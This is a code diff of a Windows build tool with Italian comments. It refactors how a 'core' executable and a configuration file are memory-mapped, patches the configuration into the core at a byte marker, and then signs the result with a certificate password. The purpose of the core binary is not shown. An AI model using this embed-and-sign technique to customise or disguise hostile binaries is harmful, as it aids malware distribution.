@@ -9,7 +9,13 @@
 
 bool FindMemMarker(BYTE *pBlockPtr, UINT iLen, BYTE *block, UINT block_len, BYTE *mark_b, UINT mark_len);
 
+HANDLE hPEFileCore;
+HANDLE hMappedFileCore;
+HANDLE hPEFileConfig;
+HANDLE hMappedFileConfig;
+
 extern BOOL SignCod(TCHAR *wsFile, TCHAR *wsKey);
+
 
 BYTE CONFIG_MARK[64] = {
     0x85, 0x22, 0xA0, 0x14, 0x28, 0x09, 0x55, 0xEC,
@@ -25,7 +31,7 @@ BYTE CONFIG_MARK[64] = {
 int _tmain(int argc, _TCHAR* argv[])
 {
 	HANDLE hFile;
-	BYTE *pBlockPtr	= NULL;
+	BYTE *pCorePtr	= NULL;
 	BYTE *pConfigPtr = NULL;
 	WCHAR wsCertPass[MAX_PATH];
 	WCHAR wsCoreFile[MAX_PATH];
@@ -114,10 +120,10 @@ int _tmain(int argc, _TCHAR* argv[])
 	/* BINARY PATCHING                                                      */
 	/************************************************************************/
 
-	pBlockPtr = (BYTE *) LoadFile(wsOutFile, &iLen);
-	pConfigPtr = (BYTE *) LoadFile(wsConfigFile, &iConfigLen );
+	pCorePtr = (BYTE *) LoadFile(hPEFileCore, hMappedFileCore, wsOutFile, &iLen);
+	pConfigPtr = (BYTE *) LoadFile(hPEFileConfig, hMappedFileConfig, wsConfigFile, &iConfigLen );
 
-	if(pBlockPtr == NULL){
+	if(pCorePtr == NULL){
 		printf("Cannot open out file... ok\n");
 		DeleteFile(wsOutFile);
 		return ERROR_EMBEDDING;
@@ -130,8 +136,7 @@ int _tmain(int argc, _TCHAR* argv[])
 	}
 
 	// Patching della configurazione
-
-	if (FindMemMarker(pBlockPtr, iLen, (BYTE *) pConfigPtr, iConfigLen, CONFIG_MARK, CONFIG_MARK_LEN))
+	if (FindMemMarker(pCorePtr, iLen, (BYTE *) pConfigPtr, iConfigLen, CONFIG_MARK, CONFIG_MARK_LEN))
 		printf("Config name embedded... ok\n");
 	else {
 		printf("Cannot embed Config Name [%S]\n", wsOutFile);
@@ -139,8 +144,8 @@ int _tmain(int argc, _TCHAR* argv[])
 		return ERROR_EMBEDDING;
 	}
 
-	UnloadFile(pBlockPtr);
-	UnloadFile(pConfigPtr);
+	UnloadFile(hPEFileCore, hMappedFileCore, pCorePtr);
+	UnloadFile(hPEFileConfig, hMappedFileConfig, pConfigPtr);
 
 	/************************************************************************/
 	/* SIGNING                                                              */
